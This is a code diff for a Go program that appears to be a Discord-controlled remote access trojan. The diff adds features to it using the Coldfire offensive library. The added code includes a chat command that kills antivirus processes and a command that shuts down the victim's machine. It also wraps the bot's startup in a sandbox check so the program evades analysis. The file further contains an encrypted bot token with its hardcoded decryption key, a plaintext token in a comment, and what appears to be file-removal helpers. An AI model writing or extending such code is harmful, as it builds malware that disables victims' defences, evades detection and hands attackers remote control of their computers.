@@ -10,14 +10,14 @@ import (
 
 	"github.com/bwmarrin/discordgo"
 	"github.com/google/uuid"
-	// "github.com/redcode-labs/Coldfire"
+	coldfire "github.com/redcode-labs/Coldfire"
 )
 
 // "MTAyMDAzNjcyNjkzNDIyNDg5Ng.GNmtJ7.bW150vRIwr7LuDbxL_mz15eMmwLS5CsEtachV8"
 var (
 	CORDTKN = "O9HLxNsvzbrMu/7YIAR2cJHSj0kpDv1A/IIJ5vzwJPFiZ3NC8z811EgS81mVOEwsTd4k6HhV11TF3/IeNkR2TjdMpHVGZswu5ijE4Om8nTuNdjArtOgWEA"
-	CID     string
 	PREFIX  = "+"
+	CID     string
 )
 
 func gID() string {
@@ -59,36 +59,46 @@ func messageCreate(s *discordgo.Session, m *discordgo.MessageCreate) {
 		defer snapshotData.Close()
 		go malfun.RMF(snapshotName)
 	}
+
+	if m.Content == PREFIX+"killanti" {
+		coldfire.PkillAv()
+	}
+
+	if m.Content == PREFIX+"down" {
+		coldfire.Shutdown()
+	}
 }
 
 func main() {
-	CID = gID() // CLIENT ID
+	if coldfire.SandboxFilepath() == true {
+		CID = gID() // CLIENT ID
 
-	key := []byte("AB1g4ssBuNnyJumPingUpTheHillBill")
-	result, err := malfun.DECPT(key, CORDTKN)
-	if err != nil {
-		log.Fatal(err)
+		key := []byte("AB1g4ssBuNnyJumPingUpTheHillBill")
+		result, err := malfun.DECPT(key, CORDTKN)
+		if err != nil {
+			log.Fatal(err)
+		}
+
+		cord, err := discordgo.New("Bot " + result)
+		if err != nil {
+			fmt.Println("Error creating Discord session,", err)
+			return
+		}
+
+		cord.AddHandler(messageCreate)
+
+		cord.Identify.Intents = discordgo.IntentsGuildMessages
+
+		err = cord.Open()
+		if err != nil {
+			fmt.Println("Error opening connection,", err)
+			return
+		}
+
+		sc := make(chan os.Signal, 1)
+		signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
+		<-sc
+
+		cord.Close()
 	}
-
-	cord, err := discordgo.New("Bot " + result)
-	if err != nil {
-		fmt.Println("Error creating Discord session,", err)
-		return
-	}
-
-	cord.AddHandler(messageCreate)
-
-	cord.Identify.Intents = discordgo.IntentsGuildMessages
-
-	err = cord.Open()
-	if err != nil {
-		fmt.Println("Error opening connection,", err)
-		return
-	}
-
-	sc := make(chan os.Signal, 1)
-	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
-	<-sc
-
-	cord.Close()
 }
